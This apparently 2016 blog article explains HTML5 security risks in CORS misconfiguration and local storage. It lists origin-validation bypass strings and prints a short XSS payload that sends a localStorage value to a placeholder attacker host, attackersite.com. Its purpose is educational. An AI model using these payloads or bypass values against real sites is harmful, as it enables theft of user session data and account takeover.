---
HTML5 Introduces New Security Threats!
---
<article class="post-listing post-15839 post type-post status-publish format-standard has-post-thumbnail hentry category-articles category-deepdot-news tag-html5 tag-introduces tag-security tag-threats">
    <div class="post-inner">
    <p class="post-meta">
    <span>Posted by: <a href="https://www.deepdotweb.com/author/sculptor/" title="">sculptor </a></span>
    <span>October 16, 2016</span>
    <span>in <a href="https://www.deepdotweb.com/category/articles/" rel="category tag">Articles</a>, <a href="https://www.deepdotweb.com/category/deepdot-news/" rel="category tag">Featured</a></span>
    <span><a href="https://www.deepdotweb.com/2016/10/16/html5-introduces-new-security-threats/#comments">2 Comments</a></span>
    </p>
    <div class="clear"></div>
    <div class="entry">
    <p>HTML5, the fifth standard of HTML released in 2014, is slowly becoming more prevalent across the internet as browsers adopt the new protocol and webpages are updated to make use of the new features. HTML is the technology at the basis of the internet, and acts as the structured content on webpages – text &amp; images (and now with HTML5 videos too) all appear in HTML code on a webpage. HTML5 attempts to bridge the gap left by old HTML standards, which failed to natively support multimedia and extensive API’s.   Two of these new features are CORS (Cross Origin Resource Sharing) and Local Storage.</p>
    <p>CORS came about because developers felt restricted by the <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin policy</a> (an essential concept in web application security) and therefore felt a need to work around it. The same-origin policy (SOP) is used within web browsers to restrict access originating from one domain from accessing content originating from another. For example, say you have your banking information opened in one tab, and then you access another malicious website in another tab. The same-origin policy prevents that malicious website from making requests from your browser on your behalf (using AJAX calls made from scripts received from a malicious site, which allow your browser to transfer data with a server without refreshing the page) and impersonating you, which would allow that malicious website to steal your money.</p>
    <p><img class="wp-image-15840 aligncenter" src="https://www.deepdotweb.com/wp-content/uploads/2016/10/http-www-lucadentella-it-blog-wp-content-uploads.jpeg" alt="http://www.lucadentella.it/blog/wp-content/uploads/2013/07/cross-blocked.jpg" srcset="https://www.deepdotweb.com/wp-content/uploads/2016/10/http-www-lucadentella-it-blog-wp-content-uploads.jpeg 490w, https://www.deepdotweb.com/wp-content/uploads/2016/10/http-www-lucadentella-it-blog-wp-content-uploads-300x198.jpeg 300w" sizes="(max-width: 490px) 100vw, 490px"/></p>
    <p>CORS brings about new ways to share resources between domains which circumvent SOP restrictions. The rules set for CORS which allow cross domain access are established within <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers">HTTP headers</a>. One such header is the “Access-Control-Allow-Origin” header, which specifies which origins are allowed to share resources. If this header is set to the “*” (wildcard) value, any origins are allowed to share data. Even if headers seem to be set securely, <a href="https://www.owasp.org/index.php/Data_Validation">validation bypass techniques</a> can be used. For example, to bypass an origin set to <strong>www.government.com</strong>, and attacker could try the following values and see if they might circumvent restrictions: <strong>wwwxgovernment.com, www.government.com.malicious.site</strong>, null values, etc, to trick the underlying system. This means if you had visited your banking site and a malicious site in another tab, the malicious site can use AJAX requests from your browser to share information with your banking account and you wouldn’t even be able to tell this was going on in the background. Depending on how other headers are configured, this could let an attacker impersonate you on your bank account and rob you of your hard earned money, all because developers didn’t implement the CORS protocol securely, or validate/sanitize input correctly.</p>
    <p>Another feature introduced in HTML5 is local storage. Before local storage, data shared between websites and browsers was stored in objects called cookies. <a href="http://www.w3schools.com/html/html5_webstorage.asp">Local storage</a> simply increases the security and size of data stored within a browser. Think of this local storage as a database for website data in your browser. Inherently, different applications over the internet cannot access each other’s local storage, even with CORS. However, this data can be attacked through another vulnerability called XSS (cross-site scripting), which occurs when a malicious attacker injects javascript into a web application that doesn’t sanitize input data.</p>
    <p>For example, see the comment section at the bottom of this page? If an attacker injected a &lt;script&gt;&lt;/script&gt; HTML tag into the comment box and the website didn’t sanitize the data, the attacker could inject javascript into his comment. Whenever a visitor loaded the page, they would load the attackers comment which includes his javascript code, which could steal session cookies from the same domain and send them to the attacker so he could essentially take control of unsuspecting user accounts. XSS is a vulnerability where an attacker can inject javascript into an applications original HTML markup, therefore bypassing SOP or CORS restrictions. XSS vulnerabilities work well for stealing data from local storage. Injecting this script does just that:</p>
    <div id="crayon-58578d8f92018994918774" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
    <div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
    <div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
    <div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
    <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    &lt;script&gt;document.write("&lt;img src='http://attackersite.com?cookie="+localStorage.getItem('foo')+"'&gt;");
    &lt;/script&gt;
    
    // Where ‘foo’ is local storage object to be extracted and written to attacker controlled domain</textarea></div>
    <div class="crayon-main" style="">
    <table class="crayon-table">
    <tr class="crayon-row">
    <td class="crayon-nums " data-settings="show">
    <div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58578d8f92018994918774-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58578d8f92018994918774-2">2</div><div class="crayon-num" data-line="crayon-58578d8f92018994918774-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58578d8f92018994918774-4">4</div></div>
    </td>
    <td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58578d8f92018994918774-1"><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">write</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;img src='http://attackersite.com?cookie="</span><span class="crayon-o">+</span><span class="crayon-v">localStorage</span><span class="crayon-sy">.</span><span class="crayon-e">getItem</span><span class="crayon-sy">(</span><span class="crayon-s">'foo'</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-s">"'&gt;"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58578d8f92018994918774-2"><span class="crayon-ta">&lt;/script&gt;</span></div><div class="crayon-line" id="crayon-58578d8f92018994918774-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-58578d8f92018994918774-4"><span class="crayon-c">// Where ‘foo’ is local storage object to be extracted and written to attacker controlled domain</span></div></div></td>
    </tr>
    </table>
    </div>
    </div>
    
    <p>
    Also, if a user has access to their browser, they have access to all local storage data. For example, if a victim’s browser is hooked with <a href="http://beefproject.com/">BeEF</a>, all local storage data can simply be <a href="https://github.com/beefproject/beef/wiki/Module:-Get-Local-Storage">extracted</a>. For these reasons it is not recommended that sensitive data is stored in local storage.</p>
    <p>Because most web vulnerabilities exist because web developers implemented a site poorly, adding new features means that many lazy developers will inevitably create new attack vectors. This is great news for hackers, but unfortunately bad news for everybody else.</p>
    <p><img class="wp-image-15841 aligncenter" src="https://www.deepdotweb.com/wp-content/uploads/2016/10/http-s2-quickmeme-com-img-5c-5cc6a589a13b8355645.jpeg" alt="http://s2.quickmeme.com/img/5c/5cc6a589a13b83556454d1084cb44052561715bf0825469aa47b55c172b8e598.jpg" srcset="https://www.deepdotweb.com/wp-content/uploads/2016/10/http-s2-quickmeme-com-img-5c-5cc6a589a13b8355645.jpeg 600w, https://www.deepdotweb.com/wp-content/uploads/2016/10/http-s2-quickmeme-com-img-5c-5cc6a589a13b8355645-300x200.jpeg 300w" sizes="(max-width: 600px) 100vw, 600px"/></p>
    </div>
    <span style="display:none"><a href="https://www.deepdotweb.com/tag/html5/" rel="tag">html5</a> <a href="https://www.deepdotweb.com/tag/introduces/" rel="tag">introduces</a> <a href="https://www.deepdotweb.com/tag/security/" rel="tag">security</a> <a href="https://www.deepdotweb.com/tag/threats/" rel="tag">threats</a></span> <span style="display:none" class="updated">2016-10-16</span>
    <div style="display:none" class="vcard author" itemprop="author" itemscope itemtype="http://schema.org/Person"><strong class="fn" itemprop="name"><a href="https://www.deepdotweb.com/author/sculptor/" title="Posts by sculptor" rel="author">sculptor</a></strong></div>
    </div>
</article>
